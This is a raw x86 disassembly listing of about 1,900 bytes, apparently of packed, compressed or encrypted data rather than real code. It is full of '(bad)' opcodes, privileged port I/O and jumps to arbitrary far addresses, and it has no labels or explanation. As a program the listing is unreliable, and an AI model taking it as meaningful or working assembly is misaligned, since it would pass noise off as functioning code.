  4175af:	and    eax,0xa0c06ff9
  4175b4:	xchg   esp,eax
  4175b5:	popa   
  4175b6:	xchg   esi,eax
  4175b7:	jmp    0xacc85c9c
  4175bc:	push   ebx
  4175bd:	ret    
  4175be:	cs (bad) 
  4175c0:	sub    eax,0x34bb645d
  4175c5:	xchg   BYTE PTR [edi],cl
  4175c7:	mov    ds:0x667bdc1c,eax
  4175cc:	dec    eax
  4175cd:	cmp    BYTE PTR [eax],al
  4175cf:	fnsave [edx+ebx*1+0x69b6bbbc]
  4175d6:	mov    eax,0x93ef4e4f
  4175db:	rcl    dl,1
  4175dd:	call   0xcaa77c2
  4175e2:	sub    eax,0x9ae4b201
  4175e7:	adc    BYTE PTR [eax],bl
  4175e9:	retf   0x3d1a
  4175ec:	sub    DWORD PTR [edi-0x1bec7240],esp
  4175f2:	ins    DWORD PTR es:[edi],dx
  4175f3:	in     eax,0x4e
  4175f5:	mov    WORD PTR [eax-0x770933e2],ds
  4175fb:	ins    BYTE PTR es:[edi],dx
  4175fc:	add    eax,0x41349219
  417601:	mov    al,0x64
  417603:	or     BYTE PTR fs:[eax+ecx*2+0xc8fabc0],al
  41760b:	in     eax,0x4f
  41760d:	in     eax,dx
  41760e:	imul   ebp,DWORD PTR ds:0xb1126301,0xb27849bf
  417618:	jge    0x4175f9
  41761a:	jp     0x4175f2
  41761c:	stos   BYTE PTR es:[edi],al
  41761d:	bound  ebx,QWORD PTR [ebp+0x7927d5e9]
  417623:	lods   al,BYTE PTR ds:[esi]
  417624:	popf   
  417625:	mov    bh,0x3b
  417627:	int3   
  417628:	scas   al,BYTE PTR es:[edi]
  417629:	and    ah,BYTE PTR [esi]
  41762b:	ss push 0x6abfa6f0
  417631:	xor    dl,dl
  417633:	cli    
  417634:	jae    0x417686
  417636:	fcmovu st,st(7)
  417638:	addr16 inc ebx
  41763a:	jne    0x4175f6
  41763c:	popf   
  41763d:	sbb    esi,ebp
  41763f:	retf   
  417640:	aam    0x4a
  417642:	push   ecx
  417643:	pop    edi
  417644:	jge    0x417651
  417646:	mov    ds:0xac8e958c,eax
  41764b:	in     eax,dx
  41764c:	iret   
  41764d:	cmp    ecx,DWORD PTR [esi+0x57fc5d85]
  417653:	out    dx,al
  417654:	adc    BYTE PTR [ecx-0x789b9091],ah
  41765a:	adc    DWORD PTR [ecx],0x482cdab0
  417660:	aaa    
  417661:	repz mov esp,0x1ee53a64
  417667:	sub    ebx,DWORD PTR [edx]
  417669:	sbb    edx,DWORD PTR [ecx+0x69b78b47]
  41766f:	(bad)  
  417670:	jb     0x41768b
  417672:	adc    edi,ebx
  417674:	sbb    esi,DWORD PTR [ebp-0xe]
  417677:	jae    0x417639
  417679:	pop    eax
  41767a:	icebp  
  41767b:	sbb    BYTE PTR [eax],bl
  41767d:	fs out 0x56,al
  417680:	test   al,0x5f
  417682:	add    bl,BYTE PTR [edi]
  417684:	ins    BYTE PTR es:[edi],dx
  417685:	addr16 dec ecx
  417687:	fiadd  WORD PTR [esi+0x2f]
  41768a:	adc    al,0xd7
  41768c:	adc    DWORD PTR [edi+0x14199219],ecx
  417692:	add    eax,0x9beb0fac
  417697:	sbb    dl,0xb3
  41769a:	int3   
  41769b:	sub    al,0x39
  41769d:	cmp    esp,DWORD PTR [ecx]
  41769f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a0:	mov    esp,0xb2628091
  4176a5:	jmp    0x41768e
  4176a7:	imul   edi,DWORD PTR [edi+ebx*4-0x3f269354],0xffffff87
  4176af:	stc    
  4176b0:	pop    esi
  4176b1:	cmp    BYTE PTR [eax-0x26],bh
  4176b4:	xor    eax,0x33d8f6de
  4176b9:	fistp  QWORD PTR [eax-0x1ab291f8]
  4176bf:	or     DWORD PTR [edx-0x46],0xffffffc8
  4176c3:	inc    ecx
  4176c4:	out    0x1e,al
  4176c6:	dec    edi
  4176c7:	cmp    ah,BYTE PTR [ebp-0x8495b8f]
  4176cd:	mov    eax,0xd569debe
  4176d2:	lods   eax,DWORD PTR ds:[esi]
  4176d3:	ret    0x1b26
  4176d6:	pop    ebx
  4176d7:	rcr    BYTE PTR [esi],1
  4176d9:	sub    eax,0xced05cd8
  4176de:	mov    esi,0x4e737c21
  4176e3:	xor    eax,0xcaf42060
  4176e8:	xor    ebp,edx
  4176ea:	jmp    0x4176df
  4176ec:	adc    BYTE PTR [eax+0x75],dh
  4176ef:	mov    esi,0x428c086e
  4176f4:	sub    eax,0x668412a7
  4176f9:	lds    edx,FWORD PTR [eax]
  4176fb:	mov    esp,0x9c7802d9
  417700:	jg     0xa05fbd72
  417706:	js     0x417752
  417708:	ss retf 0xf883
  41770c:	xor    BYTE PTR [edi+0x64],cl
  41770f:	(bad)  [esi]
  417711:	pop    edi
  417712:	inc    esp
  417713:	sbb    BYTE PTR [edx-0x65],bl
  417716:	ins    BYTE PTR es:[edi],dx
  417717:	int3   
  417718:	iret   
  417719:	cmp    ah,ah
  41771b:	add    DWORD PTR [ecx+esi*2+0x4cefa90],edi
  417722:	out    dx,al
  417723:	inc    edx
  417724:	rcl    ecx,0xea
  417727:	sub    BYTE PTR [edi+0x63f314c5],bl
  41772d:	mov    ah,0x42
  41772f:	pop    esp
  417730:	dec    edx
  417731:	push   ss
  417732:	jl     0x41774f
  417734:	pushf  
  417735:	or     BYTE PTR fs:[ecx+ebp*8],dl
  417739:	rcr    DWORD PTR [ecx],cl
  41773b:	pop    ss
  41773c:	mov    ds:0x7920e923,al
  417741:	xor    DWORD PTR [edx-0x5c],esi
  417744:	sub    BYTE PTR [edx],dh
  417746:	mov    bl,0x2d
  417748:	cmp    ax,0xd79d
  41774c:	or     eax,0xa3e8984c
  417751:	clc    
  417752:	dec    esp
  417753:	xor    ebx,edx
  417755:	das    
  417756:	push   ecx
  417757:	mov    eax,0x8e88109c
  41775c:	hlt    
  41775d:	lods   al,BYTE PTR ds:[esi]
  41775e:	and    eax,0x88aa0ce6
  417763:	adc    ebp,esp
  417765:	and    DWORD PTR [ecx+esi*2-0x69],0x30
  41776a:	xchg   ecx,eax
  41776b:	xchg   BYTE PTR [ebx],al
  41776d:	jmp    0x73a3:0x84893f93
  417774:	rcr    DWORD PTR [edx],1
  417776:	daa    
  417777:	sub    edx,ebp
  417779:	push   0x7fc0125b
  41777e:	bnd ret 
  417780:	cwde   
  417781:	bound  eax,QWORD PTR [ebx-0x50a33d3c]
  417787:	retf   
  417788:	or     cl,BYTE PTR [edx]
  41778a:	mov    bl,0x73
  41778c:	xor    ebx,esp
  41778e:	into   
  41778f:	dec    esi
  417790:	jg     0x4177df
  417792:	imul   esp,DWORD PTR [ecx],0xde49587a
  417798:	add    BYTE PTR ds:[ebx],cl
  41779b:	cmp    ecx,DWORD PTR [edi]
  41779d:	inc    edi
  41779e:	sub    al,0xb5
  4177a0:	add    al,0x23
  4177a2:	fdivr  DWORD PTR [ebx-0x1f4c3a9b]
  4177a8:	icebp  
  4177a9:	aad    0x9b
  4177ab:	and    ebp,0x4a0d22b0
  4177b1:	mov    es:0x5cbf99ad,al
  4177b7:	mov    cl,0xfa
  4177b9:	lods   al,BYTE PTR ds:[esi]
  4177ba:	inc    edi
  4177bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177bc:	add    al,0x23
  4177be:	sub    BYTE PTR [ebp-0x5007fb90],ah
  4177c4:	cmp    BYTE PTR [edx-0x69bd6bb1],ah
  4177ca:	sbb    bh,BYTE PTR [ebp+eax*1-0x5eade818]
  4177d1:	loop   0x417753
  4177d3:	repnz cld 
  4177d5:	loopne 0x4177ff
  4177d7:	sbb    al,0x20
  4177d9:	and    al,0x88
  4177db:	push   esi
  4177dc:	sbb    BYTE PTR [eax+0x53],0x28
  4177e0:	or     ch,BYTE PTR [ebx-0x61dfb484]
  4177e6:	adc    DWORD PTR [ecx+0x31],0x33
  4177ea:	inc    edi
  4177eb:	jp     0x417803
  4177ed:	sbb    DWORD PTR [esi],esp
  4177ef:	push   esp
  4177f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177f1:	add    BYTE PTR [ecx+0x4583cde5],ch
  4177f7:	sbb    ebp,DWORD PTR [ebx+0x67]
  4177fa:	adc    BYTE PTR [eax+0x57],0xa6
  4177fe:	push   ebp
  4177ff:	repnz cmp dl,bh
  417802:	stos   DWORD PTR es:[edi],eax
  417803:	pop    eax
  417804:	(bad)  
  417805:	mov    WORD PTR [edi+0x37],?
  417808:	jno    0xdd56eb7f
  41780e:	sub    eax,0x25193133
  417813:	sbb    ah,BYTE PTR [edi+0x39]
  417816:	loopne 0x417822
  417818:	lods   al,BYTE PTR ds:[esi]
  417819:	pusha  
  41781a:	xor    dl,BYTE PTR [edi+0x7]
  41781d:	mov    ah,0xe3
  41781f:	clc    
  417820:	out    dx,al
  417821:	out    0xfc,eax
  417823:	(bad)  
  417824:	pop    edx
  417825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417826:	loope  0x4177d2
  417828:	test   eax,0xec68b842
  41782d:	jo     0x4177fd
  41782f:	mov    ebp,DWORD PTR [esi-0xc]
  417832:	jecxz  0x417849
  417834:	or     al,0x56
  417836:	(bad)  
  417838:	loope  0x417851
  41783a:	scas   al,BYTE PTR es:[edi]
  41783b:	or     bh,al
  41783d:	dec    edx
  41783e:	fsubr  DWORD PTR [ebx+eiz*4-0x6e]
  417842:	mov    al,0x95
  417844:	xchg   edx,eax
  417845:	scas   eax,DWORD PTR es:[edi]
  417846:	inc    esp
  417847:	bound  ebp,QWORD PTR [esi-0x58]
  41784a:	xor    bl,ch
  41784c:	cmc    
  41784d:	jb     0x41786f
  41784f:	mov    eax,0x3f651ee
  417854:	and    dl,BYTE PTR [ebp+ebp*4+0x7a]
  417858:	inc    ecx
  417859:	adc    BYTE PTR ds:0x57a1eda3,dl
  41785f:	leave  
  417860:	mov    dh,0xbf
  417862:	data16 (bad) 
  417864:	xchg   ebp,eax
  417865:	iret   
  417866:	sbb    BYTE PTR [ecx-0x78f0704a],0x9f
  41786d:	xchg   esi,eax
  41786e:	in     al,dx
  41786f:	and    al,0x48
  417871:	loopne 0x4178db
  417873:	sbb    ebx,DWORD PTR [esi]
  417875:	out    dx,al
  417876:	inc    ebp
  417877:	xchg   ebx,ecx
  417879:	dec    ecx
  41787a:	pop    ebx
  41787b:	or     edx,eax
  41787d:	loopne 0x417842
  41787f:	inc    ebx
  417880:	jnp    0x4178d6
  417882:	xor    edi,ebx
  417884:	xor    BYTE PTR [eax],al
  417886:	mov    esp,DWORD PTR [eax]
  417888:	jno    0x417868
  41788a:	sbb    eax,0x9e4c89a4
  41788f:	call   0xc50a:0x5d2d4841
  417896:	outs   dx,DWORD PTR ds:[esi]
  417897:	sub    eax,0x9f31cb07
  41789c:	loopne 0x417870
  41789e:	jo     0x417903
  4178a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a1:	loope  0x41782e
  4178a3:	stos   BYTE PTR es:[edi],al
  4178a4:	sbb    dh,BYTE PTR [edi-0xa]
  4178a7:	or     eax,0x99d3105f
  4178ac:	dec    eax
  4178ad:	test   BYTE PTR [ecx+0x4c64342f],bh
  4178b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b4:	push   edx
  4178b5:	jg     0x4178b6
  4178b7:	aad    0xa4
  4178b9:	mov    cl,0x22
  4178bb:	sub    al,0xa8
  4178bd:	int3   
  4178be:	test   DWORD PTR [eax+0x27182dbb],ecx
  4178c4:	add    eax,0x21ea287d
  4178c9:	jge    0x4178a5
  4178cb:	aad    0xcc
  4178cd:	dec    DWORD PTR [esi+0x1e770579]
  4178d3:	push   0x1c
  4178d5:	cs stos DWORD PTR es:[edi],eax
  4178d7:	sahf   
  4178d8:	shr    BYTE PTR [eax-0x1a],cl
  4178db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178dc:	mov    eax,0x4e879da1
  4178e1:	into   
  4178e2:	push   esp
  4178e3:	and    dl,BYTE PTR [esi]
  4178e5:	out    dx,al
  4178e6:	pop    ecx
  4178e7:	fimul  WORD PTR [esi+esi*4]
  4178ea:	and    BYTE PTR [esi],cl
  4178ec:	mov    eax,0xfeec34ec
  4178f1:	mov    bl,BYTE PTR [ecx]
  4178f3:	xchg   ebp,eax
  4178f4:	test   cl,0xb1
  4178f7:	push   ss
  4178f8:	and    eax,0xee3e932b
  4178fd:	cmp    eax,DWORD PTR [ebp-0x53c84aa4]
  417903:	sbb    al,0x5d
  417905:	lods   al,BYTE PTR ds:[esi]
  417906:	clc    
  417907:	mov    ah,0x98
  417909:	ins    DWORD PTR es:[edi],dx
  41790a:	clc    
  41790b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41790c:	ficom  WORD PTR [eax-0x4f]
  41790f:	inc    DWORD PTR [esi]
  417911:	ja     0x4178ae
  417913:	mov    ds:0x7ab754fb,eax
  417918:	xchg   esi,eax
  417919:	inc    edi
  41791a:	jno    0x4178af
  41791c:	int3   
  41791d:	pop    es
  41791e:	xchg   ebp,eax
  41791f:	mov    gs,WORD PTR [ecx]
  417921:	or     BYTE PTR [ecx-0x741b7255],bh
  417927:	mov    ah,0x37
  417929:	jne    0x417965
  41792b:	(bad)  
  41792c:	jo     0x4179aa
  41792e:	fucomi st,st(3)
  417930:	clc    
  417931:	inc    edx
  417932:	xchg   esp,eax
  417933:	test   al,0x31
  417935:	add    BYTE PTR [ebx+0x4c2caee5],dl
  41793b:	mov    dh,0x7b
  41793d:	dec    ebx
  41793e:	out    dx,al
  41793f:	(bad)  
  417940:	and    DWORD PTR [edx-0xfbddbc5],esp
  417946:	push   0x37
  417948:	pop    ebp
  417949:	ret    0xaaf
  41794c:	imul   ebp,DWORD PTR ds:0x7823ff72,0xa9fa2fd9
  417956:	stos   DWORD PTR es:[edi],eax
  417957:	xchg   edi,eax
  417958:	push   ds
  417959:	xchg   esi,eax
  41795a:	cli    
  41795b:	mov    ebp,0x1911bb66
  417960:	push   cs
  417961:	cs mov ecx,0x1d51b2eb
  417967:	(bad)  
  417969:	out    dx,eax
  41796a:	and    al,0xc5
  41796c:	(bad)  
  41796d:	lods   al,BYTE PTR es:[esi]
  41796f:	jp     0x417905
  417971:	add    edx,DWORD PTR [edi+ecx*4]
  417974:	lods   eax,DWORD PTR ds:[esi]
  417975:	or     bh,BYTE PTR [edx]
  417977:	(bad)
  41797a:	pop    DWORD PTR [edi]
  41797c:	adc    al,BYTE PTR [edi]
  41797e:	lods   al,BYTE PTR ds:[esi]
  41797f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417980:	adc    dl,BYTE PTR [eax]
  417982:	cmp    BYTE PTR [ecx-0x29],ch
  417985:	sbb    BYTE PTR [edx+0x45],bl
  417988:	jne    0x41790e
  41798a:	arpl   dx,si
  41798c:	outs   dx,DWORD PTR ds:[esi]
  41798d:	mov    ds:0x2264ca6e,al
  417992:	out    dx,eax
  417993:	cdq    
  417994:	ja     0x417a0b
  417996:	pop    esp
  417997:	test   eax,0x85e44349
  41799c:	adc    al,0x73
  41799e:	(bad)  
  41799f:	push   esp
  4179a0:	out    dx,al
  4179a1:	xchg   ecx,eax
  4179a2:	cmp    edi,eax
  4179a4:	cmp    al,0xb
  4179a6:	push   ecx
  4179a7:	mov    eax,ds:0xf535505a
  4179ac:	and    eax,DWORD PTR [ecx]
  4179ae:	fld    QWORD PTR [eax+ebx*4+0x53b62344]
  4179b5:	fisttp WORD PTR [edi-0x4a]
  4179b8:	aam    0xa5
  4179ba:	sar    DWORD PTR [esi],1
  4179bc:	es jp  0x417977
  4179bf:	cmp    eax,0xa5c5c8b
  4179c4:	bound  ebp,QWORD PTR [edi-0x3247c109]
  4179ca:	pop    es
  4179cb:	rcr    ebp,cl
  4179cd:	mov    ds:0x941171b3,al
  4179d2:	dec    eax
  4179d3:	fcomp  DWORD PTR [ebp+0x6d]
  4179d6:	or     eax,0xf22effb
  4179db:	or     bl,BYTE PTR [edx-0x6d419c53]
  4179e1:	test   DWORD PTR ds:0x92f68ced,edi
  4179e7:	cli    
  4179e8:	(bad)  
  4179e9:	pop    ds
  4179ea:	pop    ebx
  4179eb:	call   0x3b5d:0x26ec58fe
  4179f2:	dec    edi
  4179f3:	sti    
  4179f4:	adc    BYTE PTR [eax],ch
  4179f6:	push   ds
  4179f7:	outs   dx,BYTE PTR ds:[esi]
  4179f8:	sbb    edi,0xed076944
  4179fe:	xchg   edx,eax
  4179ff:	cmp    dl,BYTE PTR [ebx-0x5a]
  417a02:	sbb    al,0x38
  417a04:	(bad)  
  417a05:	std    
  417a06:	test   DWORD PTR [ebx+ebx*1+0x5485ecf8],ebp
  417a0d:	fadd   DWORD PTR [ecx+ecx*2-0x2404f97d]
  417a15:	and    ebx,DWORD PTR [ebx+0x78]
  417a18:	ret    
  417a19:	into   
  417a1a:	mov    al,ds:0xfd13a1f0
  417a1f:	adc    eax,ecx
  417a21:	(bad)  
  417a22:	push   ebx
  417a23:	loope  0x417a6d
  417a25:	mov    edx,DWORD PTR [ebp-0xb13b4b9]
  417a2b:	sub    edx,DWORD PTR [edx-0x3f4c752a]
  417a31:	stc    
  417a32:	scas   al,BYTE PTR es:[edi]
  417a33:	mov    ah,0x75
  417a35:	xchg   edx,eax
  417a36:	cs rcr esp,cl
  417a39:	mov    edi,0xee2628b3
  417a3e:	mov    bl,0x9f
  417a40:	jp     0x417a0b
  417a42:	mov    ds:0x5fea241d,eax
  417a47:	push   0xffffffe0
  417a49:	push   edi
  417a4a:	sbb    DWORD PTR [ebx-0x3ac6abdc],ecx
  417a50:	mov    DWORD PTR [ebp+edx*2-0x26479cef],esi
  417a57:	push   ebx
  417a58:	inc    ebx
  417a59:	out    0x9d,al
  417a5b:	dec    esp
  417a5c:	jg     0x417abb
  417a5e:	inc    edi
  417a5f:	xchg   ecx,eax
  417a60:	dec    eax
  417a61:	frstor [esp+ecx*1-0x78be24f1]
  417a68:	sub    edi,DWORD PTR ds:[edi-0x50c3bab1]
  417a6f:	cmp    al,BYTE PTR [ecx+0x47]
  417a72:	sbb    ecx,DWORD PTR [ecx+ebx*4+0x21f941c3]
  417a79:	call   0xf485:0xbe7417f6
  417a80:	dec    esp
  417a81:	inc    esp
  417a83:	jbe    0x417a3a
  417a85:	add    dl,BYTE PTR [ebx+0x6d]
  417a88:	into   
  417a89:	mov    bl,0x90
  417a8b:	sub    cl,dl
  417a8d:	add    eax,0x8c2676dd
  417a92:	mov    eax,0x22d9d1a4
  417a97:	ja     0x417aab
  417a99:	push   edx
  417a9a:	ins    DWORD PTR es:[edi],dx
  417a9b:	loop   0x417a34
  417a9d:	xor    ebx,DWORD PTR [esi+0x21d11aec]
  417aa3:	sbb    DWORD PTR [esi],ebp
  417aa5:	cld    
  417aa6:	xlat   BYTE PTR ds:[ebx]
  417aa7:	or     eax,0x64befe2d
  417aac:	adc    eax,0x8df8d3e9
  417ab1:	icebp  
  417ab2:	repz cli 
  417ab4:	mov    ebx,0x9e13e00e
  417ab9:	jmp    0x236f3878
  417abe:	jg     0x417b24
  417ac0:	outs   dx,BYTE PTR ds:[esi]
  417ac1:	mov    cl,0xe5
  417ac3:	mov    WORD PTR [eax-0x62],ss
  417ac6:	sar    DWORD PTR [edx+0x50],0x2f
  417aca:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  417acc:	fs aas 
  417ace:	test   al,0x9d
  417ad0:	jge    0x417ac2
  417ad2:	jl     0x417b1a
  417ad4:	add    esp,eax
  417ad6:	sub    al,0x6c
  417ad8:	pop    esi
  417ad9:	not    ecx
  417adb:	xor    al,0x20
  417add:	mov    al,0x83
  417adf:	adc    ebx,esi
  417ae1:	adc    eax,0x67a3c3f2
  417ae6:	xchg   DWORD PTR [eax+0x4c],eax
  417ae9:	sbb    eax,0x925a201e
  417aee:	jns    0x417b41
  417af0:	call   ebx
  417af2:	ja     0x417a85
  417af4:	sbb    DWORD PTR [eax-0x57],esp
  417af7:	mov    ecx,0x2c9e8510
  417afc:	mov    bh,0xc
  417afe:	mov    bl,0x1a
  417b00:	jp     0x417aad
  417b02:	mov    eax,0x188a4328
  417b07:	push   esi
  417b08:	lock rol BYTE PTR [esi],0x81
  417b0c:	in     al,0x7e
  417b0e:	pusha  
  417b0f:	mov    ecx,0xddeee6a8
  417b14:	jp     0x417b4e
  417b16:	jne    0x417b10
  417b18:	mov    al,ds:0xbeaf2fc3
  417b1d:	bound  edx,QWORD PTR [ebp-0x13]
  417b20:	mov    bh,0x65
  417b22:	pop    ebx
  417b23:	mov    ebp,0x4769423d
  417b28:	stos   DWORD PTR es:[edi],eax
  417b29:	push   es
  417b2a:	lods   al,BYTE PTR ds:[esi]
  417b2b:	and    BYTE PTR [esi-0x52],dh
  417b2e:	retf   0x51c5
  417b31:	repz mov ebx,0x7c4d0ae5
  417b37:	xor    edi,ecx
  417b39:	call   0xc014f263
  417b3e:	pop    edi
  417b3f:	mov    esp,cs
  417b41:	in     al,0x72
  417b43:	fdiv   DWORD PTR ds:0xc02086f1
  417b49:	js     0x417b25
  417b4b:	dec    eax
  417b4c:	jnp    0x417ae3
  417b4e:	sub    al,0xf4
  417b50:	xor    bl,BYTE PTR [edx-0x6560f3c6]
  417b56:	and    eax,0x7b80f1d1
  417b5b:	and    DWORD PTR [edx-0x18],ebp
  417b5e:	out    0x47,eax
  417b60:	jmp    0x417b68
  417b62:	int    0x8
  417b64:	mov    WORD PTR [ebp-0x38],es
  417b67:	into   
  417b68:	pusha  
  417b69:	ret    0x1922
  417b6c:	xabort 0x19
  417b6f:	je     0x417b5f
  417b71:	cli    
  417b72:	jge    0x417b42
  417b74:	push   ebx
  417b75:	arpl   WORD PTR [ebx+0x1a],sp
  417b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b79:	mov    cl,0xc1
  417b7b:	push   ebp
  417b7c:	sbb    dl,BYTE PTR [ecx]
  417b7e:	mov    ebp,eax
  417b80:	ds inc edx
  417b82:	cmovnp edx,DWORD PTR [ecx]
  417b85:	jae    0x417b41
  417b87:	add    al,BYTE PTR [edx+eiz*4]
  417b8a:	add    BYTE PTR [ebp+0x78],0x5e
  417b8e:	je     0x417bc9
  417b90:	xchg   ebp,eax
  417b91:	das    
  417b92:	js     0x417c0c
  417b94:	mov    ch,0x68
  417b96:	push   esp
  417b97:	mul    BYTE PTR [ebp+0x3d146d73]
  417b9d:	or     DWORD PTR [esi],0x42
  417ba0:	rcr    BYTE PTR [ebp+0x10],0x80
  417ba4:	and    al,0x2f
  417ba6:	jmp    0x417bfa
  417ba8:	call   FWORD PTR [ebp-0x2147db37]
  417bae:	push   cs
  417baf:	and    eax,ecx
  417bb1:	shl    DWORD PTR [ebx+0x62],cl
  417bb4:	dec    eax
  417bb5:	xchg   BYTE PTR [edi+0x3],ah
  417bb8:	shr    BYTE PTR [eax+0x3],1
  417bbb:	cmp    dl,BYTE PTR [esi+0xa]
  417bbe:	fs sbb eax,0xa45cf0d7
  417bc4:	xor    eax,0x316bcba7
  417bc9:	push   edi
  417bca:	add    eax,0x33a68ca7
  417bcf:	xor    esi,esi
  417bd1:	push   ebx
  417bd2:	jmp    0x417b80
  417bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bd5:	push   esi
  417bd6:	add    eax,0x7c2677e7
  417bdb:	stos   BYTE PTR es:[edi],al
  417bdc:	sahf   
  417bdd:	sub    al,0x4c
  417bdf:	mov    ds:0x68e708eb,eax
  417be4:	push   eax
  417be5:	jecxz  0x417c19
  417be7:	outs   dx,DWORD PTR ds:[esi]
  417be8:	dec    edi
  417be9:	aam    0x56
  417beb:	aaa    
  417bec:	xor    esi,ebx
  417bee:	inc    esp
  417bef:	xor    DWORD PTR [edi+0x31],eax
  417bf2:	das    
  417bf3:	scas   eax,DWORD PTR es:[edi]
  417bf4:	jb     0x417bc9
  417bf6:	jecxz  0x417be6
  417bf8:	sbb    BYTE PTR [ecx],0xb0
  417bfb:	xchg   esi,ebx
  417bfd:	cmp    al,0xc3
  417bff:	leave  
  417c00:	mov    bh,0xbd
  417c02:	pop    ecx
  417c03:	fisubr WORD PTR [ebx]
  417c05:	pop    ebp
  417c06:	cdq    
  417c07:	or     bl,BYTE PTR [ebx]
  417c09:	adc    dh,ch
  417c0b:	and    BYTE PTR [eax+0x77],dl
  417c0e:	(bad)  
  417c0f:	test   al,0x6e
  417c11:	fsubr  DWORD PTR [edx]
  417c13:	sbb    ecx,DWORD PTR [ecx-0x3fb2fa00]
  417c19:	rcr    DWORD PTR [ebx+0x7946a1e6],0x85
  417c20:	mov    esi,0xb986ee9f
  417c25:	jmp    0x9701:0x977e20bb
  417c2c:	add    al,0x2e
  417c2e:	add    BYTE PTR [edi+0x5],0x25
  417c32:	scas   al,BYTE PTR es:[edi]
  417c33:	lods   al,BYTE PTR ds:[esi]
  417c34:	adc    eax,0x53852fb8
  417c39:	mov    ah,0xf
  417c3b:	xchg   ecx,eax
  417c3c:	aam    0x86
  417c3e:	popf   
  417c3f:	inc    edx
  417c40:	push   esp
  417c41:	xor    ah,BYTE PTR [ecx+0x4f0e9252]
  417c47:	je     0x417c3a
  417c49:	sub    al,0x3f
  417c4b:	out    dx,eax
  417c4c:	lea    esi,[ebx]
  417c4e:	pop    ebp
  417c4f:	iret   
  417c50:	bound  edi,QWORD PTR [eax+0x5fab6ea3]
  417c56:	repz dec edx
  417c58:	xchg   edi,eax
  417c59:	jg     0x417cc2
  417c5b:	daa    
  417c5c:	and    eax,0xa51f4497
  417c61:	sahf   
  417c62:	es lock repz mov bh,0xdc
  417c67:	pop    ebx
  417c68:	xor    al,0xdb
  417c6a:	mov    ecx,0x7be4efe7
  417c6f:	xor    eax,esi
  417c71:	add    ebx,DWORD PTR [ecx]
  417c73:	out    0x1f,al
  417c75:	mov    edi,DWORD PTR [edi-0x74]
  417c78:	std    
  417c79:	add    eax,0x76fbccf0
  417c7e:	xor    eax,ecx
  417c80:	or     al,0x7c
  417c82:	test   DWORD PTR [ebx+0x553eaf3e],ebx
  417c88:	ss inc edx
  417c8a:	and    al,ah
  417c8c:	or     eax,0x9e1cd9a4
  417c91:	adc    BYTE PTR [ebx],dl
  417c93:	aam    0x7b
  417c95:	or     BYTE PTR [esi],dh
  417c97:	push   ss
  417c98:	or     ebx,DWORD PTR ds:0x906ed421
  417c9e:	shr    DWORD PTR [esi],0xb0
  417ca1:	jle    0x417cac
  417ca3:	mov    bh,0xf8
  417ca5:	jmp    0x417ce3
  417ca7:	sahf   
  417ca8:	add    ebp,DWORD PTR [esi+esi*2+0x6c]
  417cac:	and    ecx,ebp
  417cae:	enter  0x5bc8,0x9a
  417cb2:	push   ebx
  417cb3:	neg    BYTE PTR [edi-0x474a565c]
  417cb9:	imul   eax,DWORD PTR [eax+0x148f0d88],0x76
  417cc0:	sar    bh,cl
  417cc2:	sub    DWORD PTR [ebp+0x10],edx
  417cc5:	jmp    0x2062:0x2f3ceb4d
  417ccc:	jns    0x417cb3
  417cce:	inc    eax
  417ccf:	inc    edx
  417cd0:	and    bl,BYTE PTR [eax+ecx*8+0x44cff11b]
  417cd7:	sahf   
  417cd8:	and    ecx,DWORD PTR [eax+eax*4+0x72]
  417cdc:	adc    DWORD PTR [ebx+0x67f659da],esp
  417ce2:	rcpps  xmm0,XMMWORD PTR [edx+0x1f87c123]
  417ce9:	outs   dx,BYTE PTR ds:[esi]
  417cea:	push   ds
  417ceb:	lahf   
  417cec:	sahf   
  417ced:	not    dl
  417cef:	jne    0x417cd9
  417cf1:	dec    esp
  417cf2:	inc    ebp
  417cf3:	pop    ebx
  417cf4:	scas   al,BYTE PTR es:[edi]
  417cf5:	jno    0x417d75
  417cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf8:	jp     0x417d03
  417cfa:	leave  
  417cfb:	inc    eax
  417cfc:	jge    0x417d60
  417cfe:	retf   
  417cff:	scas   al,BYTE PTR es:[edi]
  417d00:	imul   ebx,DWORD PTR [esi],0x6f
  417d03:	inc    edi
  417d04:	ret    0xca2a
  417d07:	stos   BYTE PTR es:[edi],al
  417d08:	retf   0xd0ff
  417d0b:	rcl    ebx,1
  417d0d:	mov    cl,0xc9
  417d0f:	jmp    0x7bd56d9c
  417d14:	add    dl,BYTE PTR [ebp+edi*1-0x3c89f396]
  417d1b:	sbb    bl,dl
  417d1d:	mov    dl,0xbc
  417d1f:	test   eax,0x1b4ed51b
  417d24:	jae    0x417d01
  417d26:	mov    DWORD PTR [ecx-0x6b],edi
  417d29:	ficomp DWORD PTR [ecx+eiz*4+0x41]
  417d2d:	add    esi,0x23
  417d30:	pusha  
  417d31:	cmp    al,0x6c
  417d33:	and    ecx,DWORD PTR [esp+esi*1]
  417d36:	xor    al,0xa9
  417d38:	call   0x3040db97
  417d3d:	pop    edx
  417d3e:	or     eax,0xa92374ce
  417d43:	shl    BYTE PTR [ecx-0x16],1
  417d46:	sbb    BYTE PTR [esi+0x5780bea0],al
  417d4c:	data16 jecxz 0x417d1c
  417d4f:	pusha  
  417d50:	data16 (bad) 
  417d52:	aas    
  417d53:	mov    edx,DWORD PTR [ecx+0x2eb9a3e2]
  417d59:	dec    eax
  417d5a:	retf   0x725
  417d5d:	stos   DWORD PTR es:[edi],eax
  417d5e:	ins    DWORD PTR es:[edi],dx
  417d5f:	pop    esi
  417d60:	retf   
  417d61:	cmp    cl,BYTE PTR [edx]
  417d63:	mov    ah,0xff
  417d65:	sbb    al,0x25
  417d67:	repz cwde 
  417d69:	add    eax,0x1b0fece2
  417d6e:	fild   WORD PTR [ecx-0x4d]
  417d71:	stos   BYTE PTR es:[edi],al
  417d72:	push   ebx
  417d73:	mov    ebx,0xb89e2f88
